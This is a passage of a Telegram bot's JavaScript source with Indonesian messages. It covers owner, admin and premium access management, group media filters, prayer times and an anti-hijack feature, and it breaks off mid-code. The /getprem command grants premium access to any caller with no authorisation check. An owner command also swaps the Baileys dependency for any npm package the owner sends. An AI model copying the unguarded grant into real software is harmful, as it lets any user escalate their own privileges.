            }
        }

        text += `<blockquote><b>Total Group Premium :</b> ${premiumGroups.length}</blockquote>`;

        return ctx.reply(text, { parse_mode: "HTML" });

    } catch (err) {
        console.error(err);
        return ctx.reply("❌ Terjadi error saat mengambil list group");
    }
});

bot.command("addowner", checkOwner, (ctx) => {
    const id = Number(ctx.message.text.split(" ")[1]);

    if (!id) return ctx.reply("Usage: /addowner <id>");
    if (OWNER_ID.includes(id)) return ctx.reply("⚠️ User sudah menjadi owner.");

    OWNER_ID.push(id);
    ctx.reply(`✅ 𝗢𝘄𝗻𝗲𝗿 ditambahkan 🆔 <code>${id}</code>`, { parse_mode: "HTML" });
});

bot.command("delowner", checkOwner, (ctx) => {
    const id = Number(ctx.message.text.split(" ")[1]);

    if (!id) return ctx.reply("Usage: /delowner <id>");
    if (!OWNER_ID.includes(id)) return ctx.reply("⚠️ User bukan owner.");

    const index = OWNER_ID.indexOf(id);
    if (index > -1) OWNER_ID.splice(index, 1);
    ctx.reply(`🗑️ 𝗢𝘄𝗻𝗲𝗿 dihapus 🆔 <code>${id}</code>`, { parse_mode: "HTML" });
});

const gantiBaileysState = {};

bot.command('gantibaileys', checkOwner, async (ctx) => {
    gantiBaileysState[ctx.from.id] = true;
    await ctx.reply(
        '📦 *GANTI BAILEYS*\n\n' +
        'Kirim baileys baru, Contoh:\n\n' +
        '📌 `"whiskeysockets/baileys": "npm:@pahinak/baileys"`',
        { parse_mode: 'Markdown' }
    );
});

bot.on('text', async (ctx, next) => {
    if (!gantiBaileysState[ctx.from.id]) return next();
    
    const input = ctx.message.text;
    if (!input.includes('baileys')) return ctx.reply('❌ Format salah');
    
    try {
        const { spawn } = require('child_process');
        
        let newValue = input;
        if (input.includes('":')) {
            newValue = input.split('":')[1].trim().replace(/^"/, '').replace(/"$/, '').replace(/,$/, '');
        }
        
        const packageJson = JSON.parse(fs.readFileSync('./package.json', 'utf8'));
        const oldValue = packageJson.dependencies['@whiskeysockets/baileys'];
        packageJson.dependencies['@whiskeysockets/baileys'] = newValue;
        fs.writeFileSync('./package.json', JSON.stringify(packageJson, null, 2), 'utf8');
        
        if (fs.existsSync('./.npm')) fs.rmSync('./.npm', { recursive: true, force: true });
        if (fs.existsSync('./node_modules')) fs.rmSync('./node_modules', { recursive: true, force: true });
        if (fs.existsSync('./package-lock.json')) fs.unlinkSync('./package-lock.json');
        
        delete gantiBaileysState[ctx.from.id];
        
        await ctx.reply(
            '╭────────────────────╮\n' +
            '│ ✅ UPDATE BAILEYS SUKSES  │\n' +
            '╰────────────────────╯\n\n' +
            '▸ ❌ Bail Lama=' + oldValue + '\n' +
            '▸ ✅ Bail Terbaru=' + newValue + '\n\n' +
            '🔄 Restart otomatis dimulai...'
        );
        
        setTimeout(() => {
            const child = spawn(process.argv[0], process.argv.slice(1), { detached: true, stdio: 'inherit' });
            child.unref();
            process.exit(0);
        }, 2000);
        
    } catch (err) {
        ctx.reply('❌ ' + err.message);
        delete gantiBaileysState[ctx.from.id];
    }
});

bot.command("addadmin", checkOwner, async (ctx) => {
    const targetUserId =
        ctx.message.reply_to_message?.from.id.toString() ||
        ctx.message.text.split(" ")[1];

    if (!targetUserId)
        return ctx.reply("Format: /addadmin <user_id> atau reply user.");

    if (state.adminList.includes(targetUserId))
        return ctx.reply("⚠️ User sudah menjadi admin.");

    addAdmin(targetUserId);
    ctx.reply(`✅ Berhasil menambahkan ${targetUserId} sebagai admin.`);
});

bot.command("clearprem", checkOwner, async (ctx) => {
    if (state.premiumUsers.length === 0) {
        return ctx.reply("Tidak ada user premium.");
    }

    const total = state.premiumUsers.length;

    return ctx.reply(
`⚠️ APAKAH KAMU INGIN MENG-CLEAR SEMUA PREMIUM AKSES ?
|------------------------------------------------------------------|
Total User Premium Saat Ini 💎: ${total}
|------------------------------------------------------------------|
⌛ Jika ingin meng-clear silahkan pencet Button "ᴄʟᴇᴀʀ ᴘʀᴇᴍɪᴜᴍ"`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴄʟᴇᴀʀ ᴘʀᴇᴍɪᴜᴍ", callback_data: `clearprem_yes_${ctx.from.id}` }],
                    [{ text: "ʙᴀᴛᴀʟᴋᴀɴ", callback_data: `clearprem_no_${ctx.from.id}` }]
                ]
            }
        }
    );
});

bot.action(/clearprem_.+/, async (ctx) => {
    const parts = ctx.match[0].split("_");
    const action = parts[1];
    const ownerId = parts[2];

    try {
        if (ctx.from.id.toString() !== ownerId) {
            return ctx.answerCbQuery("Bukan punya kamu", { show_alert: true }).catch(() => {});
        }

        if (action === "no") {
            return ctx.deleteMessage().catch(() => {});
        }

        if (action === "yes") {
            const total = state.premiumUsers.length;
            state.premiumUsers = [];
            saveJSON(PATHS.premiumFile, state.premiumUsers);

            return ctx.editMessageText(
`✅ AKSES PREMIUM SEMUA USER BERHASIL DI CLEAR !!
|------------------------------------------------------------------|
💎 Total id akses premium yang di clear: ${total}
|------------------------------------------------------------------|
User sekarang tidak bisa memakai Command yang terdapat pada Script ⚠️`
            );
        }

    } catch (err) {
        console.log("CLEARREM ERROR:", err);
    }
});

bot.command("getprem", async (ctx) => {
    let targetUserId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
    } else {
        const args = ctx.message.text.split(" ");
        targetUserId = args[1];
    }

    if (!targetUserId) {
        targetUserId = ctx.from.id.toString();
    }

    if (state.premiumUsers.includes(targetUserId)) {
        return ctx.reply(`⚠️ ☇ 𝗨𝘀𝗲𝗿 𝗶𝗱 ${targetUserId} 𝗗𝗶𝗻𝘆𝗮𝘁𝗮𝗸𝗮𝗻 𝘀𝘂𝗱𝗮𝗵 𝗺𝗲𝗺𝗶𝗹𝗶𝗸𝗶 𝗮𝗸𝘀𝗲𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.`);
    }

    state.premiumUsers.push(targetUserId);
    saveJSON(PATHS.premiumFile, state.premiumUsers);

    return ctx.reply(`✅ ☇ 𝗨𝘀𝗲𝗿 𝗶𝗱 ${targetUserId} 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗱𝗶 𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 𝗸𝗲 𝗮𝗸𝘀𝗲𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.`);
});

bot.command("addprem", checkOwner, async (ctx) => {
    let targetUserId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
    } else {
        const args = ctx.message.text.split(" ");
        targetUserId = args[1];
    }

    if (!targetUserId) {
        return ctx.reply("🪧 <b>Format:</b> <code>/addprem &lt;user_id&gt;</code> atau reply chat user", { parse_mode: "HTML" });
    }

    if (state.premiumUsers.includes(targetUserId)) {
        return ctx.reply(`⚠️ <b>User</b> <code>${targetUserId}</code> sudah menjadi akses premium.`, { parse_mode: "HTML" });
    }

    const executorId = ctx.from.id.toString();

    await ctx.replyWithPhoto(
        "https://gangalink.vercel.app/i/r1468jak.jpg",
        {
            caption:
`<blockquote>
<b>╭──〔 PREMIUM ACCESS 〕──╮</b>
│  <tg-emoji emoji-id="4956461073550017373">🥷🏻</tg-emoji><b>Target ID :</b> <code>${targetUserId}</code>
│ <tg-emoji emoji-id="4958699241137505132">🟢</tg-emoji><b>Status :</b> WAITING SELECT
<b>╰────────────────────╯</b>
<i>Apakah target id sudah benar ?</i>
Jika benar pilih durasi premium.
</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "30 HARI", callback_data: `prem_30_${targetUserId}_${executorId}`, style: "success", icon_custom_emoji_id: "4956214413578207998" },
                        { text: "90 HARI", callback_data: `prem_90_${targetUserId}_${executorId}`, style: "primary", icon_custom_emoji_id: "4956214413578207998" },
                        { text: "120 HARI", callback_data: `prem_120_${targetUserId}_${executorId}`, style: "danger", icon_custom_emoji_id: "4956214413578207998" }
                    ],
                    [
                        { text: "❌ CANCEL ACTION", callback_data: `prem_cancel_${executorId}`, style: "danger", icon_custom_emoji_id: "4956612582816351459" }
                    ]
                ]
            }
        }
    );
});

bot.action(/prem_.+/, async (ctx) => {
    const data = ctx.match[0];

    if (data.startsWith("prem_cancel_")) {
        const executorId = data.split("_")[2];
        if (ctx.from.id.toString() !== executorId) {
            return ctx.answerCbQuery("❌ Kamu bukan executor command ini!", { show_alert: true });
        }
        await ctx.deleteMessage().catch(() => {});
        return;
    }

    const [_, duration, userId, executorId] = data.split("_");

    if (ctx.from.id.toString() !== executorId) {
        return ctx.answerCbQuery("❌ Tombol ini bukan milik kamu!", { show_alert: true });
    }

    if (!state.premiumUsers.includes(userId)) {
        state.premiumUsers.push(userId);
        saveJSON(PATHS.premiumFile, state.premiumUsers);
    }

    const executor = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "Unknown";

    await ctx.editMessageCaption(
`<blockquote>
<b>╭──〔 PREMIUM STATUS 〕──╮</b>
│ <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji><b>Status :</b> ACTIVE
│ <tg-emoji emoji-id="4956461073550017373">🥷🏻</tg-emoji><b>User :</b> <code>${userId}</code>
│  <tg-emoji emoji-id="4956214413578207998">📝</tg-emoji><b>Duration :</b> ${duration} Hari
│ <tg-emoji emoji-id="5870619152829386951">👑</tg-emoji><b>Executor Added :</b> ${executor}
<b>╰────────────────────╯</b>
</blockquote>`,
        { parse_mode: "HTML" }
    ).catch(() => {});
});

bot.command("deladmin", checkOwner, async (ctx) => {
    let targetUserId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
    } else {
        const args = ctx.message.text.split(" ");
        targetUserId = args[1];
    }

    if (!targetUserId) {
        return ctx.reply(
            "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
            "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
            "┇ \n" +
            "┇ 📌 *Contoh:*\n" +
            "┇ `/deladmin 1113570863`\n" +
            "┇ \n" +
            "┇ 📌 *Atau reply pesan user:*\n" +
            "┇ Ketik `/deladmin` sambil reply\n" +
            "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
            { parse_mode: "Markdown" }
        );
    }

    if (!state.adminList.includes(targetUserId)) {
        return ctx.reply(
            `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
            `┇ ❌ *BUKAN ADMIN* ❌\n` +
            `┇ \n` +
            `┇ 👤 User ID: \`${targetUserId}\`\n` +
            `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
            `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
            { parse_mode: "Markdown" }
        );
    }

    removeAdmin(targetUserId);

    await ctx.reply(
        `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
        `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
        `┇\n` +
        `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
        `┇\n` +
        `┇ 🚫 User sudah tidak memiliki\n` +
        `┇    akses admin lagi.\n` +
        `┇\n` +
        `┇ 📌 Akses admin telah dicabut.\n` +
        `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
        `\n_✨ User sekarang menjadi user biasa._`,
        { parse_mode: "Markdown" }
    );
});

bot.command("delprem", checkAdmin, async (ctx) => {
    let targetUserId;

    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id.toString();
    } else {
        const args = ctx.message.text.split(" ");
        targetUserId = args[1];
    }

    if (!targetUserId) {
        return ctx.reply(
`\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━┓
✨  CARA PAKAI COMMAND DELPREMIUM
━━━━━━━━━━━━━━━━━━━━━━━
📌 Contoh:
/delprem 1113570863
📌 Atau reply user:
/delprem (reply pesan)
💎 ┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
            { parse_mode: "Markdown" }
        );
    }

    if (!state.premiumUsers.includes(targetUserId)) {
        return ctx.reply(
`\`\`\`js
⚠️ ┏━━━━━━━━━━━━━━━━━━┓
❌ USER BUKAN PREMIUM
━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`
User ini tidak terdaftar premium sebagai
akses premium !
⚠️ ┗━━━━━━━━━━━━━━━━━━┛
\`\`\``,
            { parse_mode: "Markdown" }
        );
    }

    state.premiumUsers = state.premiumUsers.filter(id => id !== targetUserId);
    saveJSON(PATHS.premiumFile, state.premiumUsers);

    await ctx.reply(
`\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
✨  PREMIUM BERHASIL DIHAPUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`
🚫 Akses premium dicabut
📌 Sekarang user tidak memiliki akses
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        { parse_mode: "Markdown" }
    );
});

bot.command("list", checkAdmin, async (ctx) => {
  await ctx.reply(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
            ]
      }
    }
  );
});

bot.action("show_premium", async (ctx) => {
  if (state.premiumUsers.length === 0) {
    return ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙪𝙨𝙚𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢
\`\`\``,
      backBtn()
    );
  }

  let text = state.premiumUsers.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");

  await ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
${text}
⸙ 𝙩𝙤𝙩𝙖𝙡 𝙥𝙧𝙚𝙢𝙞𝙪𝙢: ${state.premiumUsers.length}
\`\`\``,
    backBtn()
  );
});

bot.action("show_admin", async (ctx) => {
  if (state.adminList.length === 0) {
    return ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\``,
      backBtn()
    );
  }

  let text = state.adminList.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");

  await ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
${text}
⸙ 𝙩𝙤𝙩𝙖𝙡: ${state.adminList.length}
\`\`\``,
    backBtn()
  );
});

bot.action("show_owner", async (ctx) => {
  if (state.ownerUsers.length === 0) {
    return ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙤𝙬𝙣𝙚𝙧
\`\`\``,
      backBtn()
    );
  }

  let text = state.ownerUsers.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");

  await ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
${text}
⸙ 𝙩𝙤𝙩𝙖𝙡: ${state.ownerUsers.length}
\`\`\``,
    backBtn()
  );
});

bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});

function backBtn() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "◀️ BACK", callback_data: "list_back", style: "danger" }]
      ]
    }
  };
}

bot.command("antivideo", async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya bisa di group");

  const member = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) return ctx.reply("❌ Hanya admin yang bisa pakai command ini");

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("📌 Format: /antivideo on /off");

  const chatId = ctx.chat.id.toString();

  if (args === "on") {
    if (!state.antiVideoGroups.includes(chatId)) {
      state.antiVideoGroups.push(chatId);
      saveJSON(PATHS.antiVideoFile, state.antiVideoGroups);
    }
    return ctx.reply("✅ Anti video aktif di grup ini");
  }

  if (args === "off") {
    state.antiVideoGroups = state.antiVideoGroups.filter(id => id !== chatId);
    saveJSON(PATHS.antiVideoFile, state.antiVideoGroups);
    return ctx.reply("❌ Anti video dimatikan");
  }

  return ctx.reply("📌 Gunakan: /antivideo on /off");
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString();
  if (!state.antiVideoGroups.includes(chatId)) return;

  try {
    await ctx.deleteMessage();
    await ctx.reply(`⚠️ @${ctx.from.username || ctx.from.first_name} 🚫 Dilarang mengirim video di grup ini!`, { parse_mode: "Markdown" });
  } catch (err) {
    console.log("Error:", err.message);
  }
});

bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya bisa di group");

  const member = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) return ctx.reply("❌ Hanya admin yang bisa pakai command ini");

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("📌 Format: /antifoto on /off");

  const chatId = ctx.chat.id.toString();

  if (args === "on") {
    if (!state.antiFotoGroups.includes(chatId)) {
      state.antiFotoGroups.push(chatId);
      saveJSON(PATHS.antiFotoFile, state.antiFotoGroups);
    }
    return ctx.reply("✅ Anti foto aktif di grup ini");
  }

  if (args === "off") {
    state.antiFotoGroups = state.antiFotoGroups.filter(id => id !== chatId);
    saveJSON(PATHS.antiFotoFile, state.antiFotoGroups);
    return ctx.reply("❌ Anti foto dimatikan");
  }

  ctx.reply("📌 Gunakan: /antifoto on /off");
});

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString();
  if (!state.antiFotoGroups.includes(chatId)) return;

  try {
    await ctx.deleteMessage();
    await ctx.reply(`⚠️ @${ctx.from.username || ctx.from.first_name} 🚫 Dilarang mengirim foto di grup ini!`, { parse_mode: "Markdown" });
  } catch (err) {
    console.log("Error:", err.message);
  }
});

bot.command("groupon", checkOwner, (ctx) => {
  setGroupMode("on");
  ctx.reply("⚠️ Bot sekarang dalam mode group only, siapapun yang ingin mencoba mengakses bot di pm bot, Bot tidak akan memberikan Menu utama.");
});

bot.command("groupoff", checkOwner, (ctx) => {
  setGroupMode("off");
  ctx.reply("✅ GROUP ONLY DI MATIKAN USER BISA MENGAKSES BOT LEWAT PRIVATE ATAU GROUP.");
});

bot.command("mode", checkOwner, (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", checkOwner, (ctx) => {
  setMode("self");
  ctx.reply("🔐 Bot Di kunci Owner.");
});

bot.command("public", checkOwner, (ctx) => {
  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

const lastChannelPost = {};

bot.on("channel_post", (ctx) => {
  if (!ctx.channelPost) return;
  lastChannelPost[ctx.chat.id] = ctx.channelPost.message_id;
});

const jadwalSholat = {
  wib: { subuh: "04:30", dzuhur: "12:00", ashar: "15:15", maghrib: "17:50", isya: "19:00" },
  wita: { subuh: "04:45", dzuhur: "12:15", ashar: "15:30", maghrib: "18:05", isya: "19:15" },
  wit: { subuh: "05:00", dzuhur: "12:30", ashar: "15:45", maghrib: "18:20", isya: "19:30" }
};

const menuSholat = (zona) => {
  const j = jadwalSholat[zona];
  return `<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT ${zona.toUpperCase()} 〕━━━╮
┃
┃ 🌅 Subuh   : ${j.subuh}
┃ ☀️ Dzuhur  : ${j.dzuhur}
┃ 🌤 Ashar   : ${j.ashar}
┃ 🌇 Maghrib : ${j.maghrib}
┃ 🌙 Isya    : ${j.isya}
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
𖠋︎ Semoga ibadah anda lancar hari ini.</b></blockquote>`;
};

const buttonBackSholat = {
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [[{ text: "⬅️ BACK", callback_data: "back_jadwal", style: "danger" }]]
  }
};

const menuUtamaSholat = `<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT INDONESIA〕━━━╮
┃
┃ Silahkan pilih zona waktu
┃ jadwal sholat yang ingin
┃ anda lihat dibawah ini.
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>`;

const buttonUtamaSholat = {
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [{ text: "🌅 WIB", callback_data: "sholat_wib", style: "success" }, { text: "🌄 WITA", callback_data: "sholat_wita", style: "danger" }],
      [{ text: "🌙 WIT", callback_data: "sholat_wit", style: "primary" }]
    ]
  }
};

bot.command("jadwalsholat", async (ctx) => {
  return ctx.reply(menuUtamaSholat, buttonUtamaSholat);
});

bot.action("back_jadwal", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  return ctx.editMessageText(menuUtamaSholat, buttonUtamaSholat);
});

bot.action("sholat_wib", async (ctx) => {
  await ctx.answerCbQuery("Membuka jadwal WIB...").catch(() => {});
  return ctx.editMessageText(menuSholat("wib"), buttonBackSholat);
});

bot.action("sholat_wita", async (ctx) => {
  await ctx.answerCbQuery("Membuka jadwal WITA...").catch(() => {});
  return ctx.editMessageText(menuSholat("wita"), buttonBackSholat);
});

bot.action("sholat_wit", async (ctx) => {
  await ctx.answerCbQuery("Membuka jadwal WIT...").catch(() => {});
  return ctx.editMessageText(menuSholat("wit"), buttonBackSholat);
});

bot.command("reactch", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ").slice(1).join("");
    const [emoji, ch] = text.split(",");

    if (!emoji || !ch) return ctx.reply("❌ Contoh: /reactch 🌸,@channel");

    const chat = await ctx.telegram.getChat(ch.trim());
    const chId = chat.id;

    const msgId = lastChannelPost[chId];
    if (!msgId) return ctx.reply("❌ Kirim 1 post baru di channel dulu");

    await ctx.telegram.setMessageReaction(chId, msgId, [{ type: "emoji", emoji: emoji.trim() }]);
    ctx.reply("✅ React berhasil");
  } catch (err) {
    ctx.reply("❌ Gagal (cek bot join channel)");
  }
});

bot.command("cekemoji", async (ctx) => {
  try {
    const targetMsg = ctx.message?.reply_to_message;
    if (!targetMsg) return ctx.reply(`<blockquote><tg-emoji emoji-id="5260293700088511294">⛔️</tg-emoji>Reply pesan yang berisi emoji premium.</blockquote>`, { parse_mode: "HTML" });

    const emojis = [];

    if (Array.isArray(targetMsg.entities)) {
      for (const entity of targetMsg.entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) {
          emojis.push({ id: entity.custom_emoji_id, emoji: targetMsg.text?.substring(entity.offset, entity.offset + entity.length) || "❔" });
        }
      }
    }

    if (Array.isArray(targetMsg.caption_entities)) {
      for (const entity of targetMsg.caption_entities) {
        if (entity.type === "custom_emoji" && entity.custom_emoji_id) {
          emojis.push({ id: entity.custom_emoji_id, emoji: targetMsg.caption?.substring(entity.offset, entity.offset + entity.length) || "❔" });
        }
      }
    }

    if (emojis.length === 0) return ctx.reply(`<blockquote><tg-emoji emoji-id="5260293700088511294">⛔️</tg-emoji>Tidak ada custom emoji terdeteksi.</blockquote>`, { parse_mode: "HTML" });

    let result = `<blockquote expandable>\n<b><tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji>CUSTOM EMOJI DETECTED</b>\n━━━━━━━━━━━━━━━━━━`;

    emojis.forEach((e, i) => {
      result += `\n<b>• Emoji ${i + 1}</b>\n${e.emoji}\n<code>${e.id}</code>\n<b><tg-emoji emoji-id="5197269100878907942">✍️</tg-emoji>Format Memakai Di HTML:</b>\n<code>&lt;tg-emoji emoji-id="${e.id}"&gt;${e.emoji}&lt;/tg-emoji&gt;</code>\n━━━━━━━━━━━━━━━━━━`;
    });

    result += `\n<b><tg-emoji emoji-id="4958699241137505132">🎁</tg-emoji>Total Custom Emoji:</b> ${emojis.length}\n</blockquote>`;

    return ctx.reply(result, { parse_mode: "HTML", disable_web_page_preview: true });
  } catch (err) {
    return ctx.reply(`<blockquote>❌ Terjadi error saat membaca emoji.</blockquote>`, { parse_mode: "HTML" });
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);
  ctx.reply(`┏━━━〔 RUNTIME 〕━━━┓\n┃ 🤖 Bot Active\n┃ ⏳ ${h} Jam ${m} Menit ${s} Detik\n┗━━━━━━━━━━━━━━━━━━┛`);
});

function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const multipliers = { s: 1000, m: 60000, h: 3600000, d: 86400000 };
  return value * multipliers[unit];
}

bot.command('setcd', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    state.COOLDOWN_TIME = 0;
    state.COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  state.COOLDOWN_TIME = time;
  state.COOLDOWN_TEXT = args[1];
  ctx.reply(`✅ Cooldown diubah ke ${state.COOLDOWN_TEXT}`);
});

bot.command("anticulik", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("Gunakan: /anticulik on | /anticulik off | /anticulik autoreject");

  if (args === "on") {
    state.antiCulik = true;
    state.autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    state.antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    state.antiCulik = true;
    state.autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  if (ctx.chat.type === "private") return ctx.reply("❌ Gunakan di group");

  const id = ctx.chat.id.toString();
  if (state.whitelistGroups.includes(id)) return ctx.reply("⚠️ Sudah SAFE");

  state.whitelistGroups.push(id);
  saveJSON(PATHS.safeFile, state.whitelistGroups);
  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();
  state.whitelistGroups = state.whitelistGroups.filter(v => v !== id);
  saveJSON(PATHS.safeFile, state.whitelistGroups);
  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;
    if (status !== "member" && status !== "administrator") return;
    if (!state.antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;
    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

    if (state.autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(() => {});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

    state.pendingGroups = state.pendingGroups || new Map();
    state.pendingGroups.set(groupId, { userId, username, fullName, groupName });

    for (let ownerId of state.ownerUsers) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
